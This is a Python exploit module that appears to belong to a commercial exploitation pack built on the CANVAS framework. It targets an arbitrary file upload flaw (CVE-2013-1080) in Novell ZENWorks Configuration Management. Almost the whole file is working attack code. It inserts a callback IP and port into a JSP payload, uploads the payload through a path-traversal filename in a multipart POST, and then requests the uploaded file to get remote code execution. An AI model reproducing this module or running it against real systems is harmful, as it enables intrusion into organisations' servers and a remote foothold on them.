#! /usr/bin/env python

#
# Proprietary D2 Exploitation Pack source code - use only under the license
# agreement specified in LICENSE.txt in your D2 Exploitation Pack
#
# Copyright DSquare Security, LLC, 2007-2013
#

import sys
import time
import os
import random

from urllib import urlopen
from sgmllib import SGMLParser

sys.path.append(".")
sys.path.append("../../")

import canvasengine
import libs.spkproxy as spkproxy

from exploitutils import *
from tcpexploit import tcpexploit


# GUI info
NAME = "Novell ZENWorks Configuration Management Arbitrary File Upload Remote Code Execution Vulnerability"

DESCRIPTION = "File Upload Remote Code Execution in Novell ZENWorks Configuration Management"

DOCUMENTATION = {}
DOCUMENTATION["VENDOR"] = "Novell"
DOCUMENTATION["Repeatability"] = "Infinite"
DOCUMENTATION["Versions Affected"] = "Novell ZENWorks Configuration Management 10 SP3 / 11 SP2"
DOCUMENTATION["Date public"] = "2013.03.22"
DOCUMENTATION["References"] = "http://www.zerodayinitiative.com/advisories/ZDI-13-049/"
DOCUMENTATION["CERT Advisory"] = ""
DOCUMENTATION["CVE Name"] = "CVE-2013-1080"
DOCUMENTATION["CVE Url"] = "http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2013-1080"
DOCUMENTATION["Notes"] = ""

VERSION = '1.0'

GTK2_DIALOG = 'dialog.glade2'

PROPERTY = {}
PROPERTY['TYPE'] = "Web Exploits"
PROPERTY['SITE'] = "Remote"
PROPERTY['ARCH'] = [ ["Windows"] ]

NOTES="""
Start converttomosdef to get a MOSDEF node from the JAVA node.
"""

CHANGELOG="""
"""


class theexploit (tcpexploit):
    
  def __init__(self):
    tcpexploit.__init__(self)
    self.host = ""    
    self.filename = os.getcwd() + "/3rdparty/D2SEC/exploits/d2sec_zcm2/d2.jsp"    
    self.protocol = "http"
    self.port = 80
    self.sslport = 443
    self.https = 1
    self.name = NAME
    return

  def neededListenerTypes(self):
    return [canvasengine.JAVASERVER]
	
  def upload_file(self):  
    # Open JSP file
    f = open(self.filename, "r")
    fdata = f.read()
    f.close()
    
    fdata = fdata.replace("CALLBACK_IP", self.callback.ip)
    fdata = fdata.replace("CALLBACK_PORT", str(self.callback.port))    
        
    # Upload JSP file            
    data = "-----------------------------7db38e3880734\r\nContent-Disposition: form-data; name=\"mainPage:_ctrl21a:FindFile:filePathTextBox\"; filename=\"../webapps/ROOT/d2.jsp\"\r\nContent-Type: Content-Type: application/octet-stream\r\n\r\n"
    data = data + fdata + "\r\n-----------------------------7db38e3880734--\r\n"      
    url = "/zenworks/jsp/index.jsp?pageid=newDocumentWizard"
    
    if self.https == 0:
        self.protocol = "http"
    else:
        self.protocol = "https"
        self.port = self.sslport
          
    mainurl = "%s://%s:%d%s" % (self.protocol, self.host, self.port, url)
    handle = spkproxy.urlopen(mainurl, exploit=self, data=data, extraheaders=[("User-Agent","Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)"), ("Content-Type", "multipart/form-data; boundary=---------------------------7db38e3880734")], verb="POST")
    data = handle.read()  

    # Execute uploaded JSP file
    url = "/d2.jsp"
    mainurl = "%s://%s:%d%s" % (self.protocol, self.host, self.port, url)
    handle = spkproxy.urlopen(mainurl, exploit=self, extraheaders=[("User-Agent","Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)")])
    data = handle.read()  
            		
    return 1

  def getargs(self):	
    self.host = self.target.interface
    self.port = int(self.argsDict.get("port", self.port))
    self.sslport = int(self.argsDict.get("sslport", self.sslport))
    self.https = int(self.argsDict.get("https", self.https))     

  def run(self):
    self.getargs()
    self.setInfo("%s attacking %s"%(NAME,self.host))
 
    ret = self.upload_file()
    
    self.setInfo("%s attacking %s - done"%(NAME, self.host))
    
    return ret

  def usage(self):
    print "Usage: " + sys.argv[0] + " -t target -p port -O https:[0|1]"
    sys.exit(0)
    
if __name__ == '__main__':
  print "Running CANVAS %s v %s" % (NAME, VERSION)
  app = theexploit()
  ret = standard_callback_commandline(app)
